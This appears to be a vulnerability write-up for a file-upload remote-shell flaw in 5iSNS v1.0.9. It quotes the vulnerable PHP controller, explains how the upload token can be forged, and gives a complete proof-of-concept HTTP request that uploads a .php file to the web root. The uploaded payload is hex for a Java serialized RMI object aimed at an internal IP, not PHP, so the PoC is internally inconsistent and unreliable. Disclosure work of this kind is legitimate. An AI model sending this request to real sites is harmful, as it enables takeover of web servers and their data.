# CVE 
# 5iSNS v1.0.9
# Front Getshell

The vulnerability was discovered by downloading the program's source code to local and online deployment tests.  

# Location:
 /app/docs/controller/doc.php
 
# Code：    
```
}elseif($action == 'upload'){
$num = param('num');



$data['file'] = $_FILES['file'];


$data['page'] = intval(param('page'));//file_get_contents("php://input");
$data['sha1'] = param('sha1');
$data['token'] = param('token');
$data['time'] = param('time');
$time1 = $data['time'];
$token = md5($conf['auth_key'].$conf['appid'].$time1);
if($token!=$data['token']||$time-intval($time1)>60){
}else{
$tmpanme = $data['file']['name'];
$tmpurl = $conf['upload_url'] . 'docview/' . $tmpanme;
$replace['online_trans_num'] = $num-1;

file_replace_var(DATA_PATH.'config/conf.default.php', $replace);
//$ooo=move_uploaded_file($data['file']['tmp_name'], "C://Windows/1111.txt");
if (!file_exists($tmpurl)) {
if (!move_uploaded_file($data['file']['tmp_name'], $tmpurl)) {
       echo xn_json_encode(array('code'=>0,'message'=>'创建文件失败'));
       return;
}
}
```

# Rows:65 
![](https://raw.githubusercontent.com/0linlin0/Code-audit/master/images/51sns1.png)
# analysis
The entire source code takes the mvc architecture. In the audit doc function module, locate the $action == 'upload' operation and find the file operation related function move_uploaded_file($data['file']['tmp_name'] at line 64.
Line 53 token value can be constructed because the value of $time token is user controllable, $tmpname is user controllable, and is directly spliced into $tmpurl.

# POC
Register a user Login and then send this packet

```
POST /51/?m=docs&c=doc&a=upload HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/plain, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://127.0.0.1/51/?m=docs&c=doc&a=create
Content-Type: multipart/form-data; boundary=---------------------------115581352129376
Content-Length: 987
Connection: close
Upgrade-Insecure-Requests: 1
Cookie: 5isns_sid=jqm5to5h1n3svpsvvjqnuk30v6; 5isns_token=rNzfQD00TVbzQEZkLJ2CPwxBt4Qc6GOms93fUACwA9J60rxBP3qQovLLHv_2BkuoyiGh8C2NFW6QuWHCaP

-----------------------------115581352129376
Content-Disposition: form-data; name="file"; filename="ccc.php"
Content-Type: text/plain

aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707735000a556e6963617374526566000c31302e3235312e302e313737000020bf0000000056b2362a00000000000000000000000000000078
-----------------------------115581352129376
Content-Disposition: form-data; name="token"

5fd2b68939868cb7d5e6425bb8ab08a2
-----------------------------115581352129376
Content-Disposition: form-data; name="time"

15799999999
-----------------------------115581352129376--
```
![](https://raw.githubusercontent.com/0linlin0/Code-audit/master/images/51sns2.png)

# Harm
Get the permissions of the web server
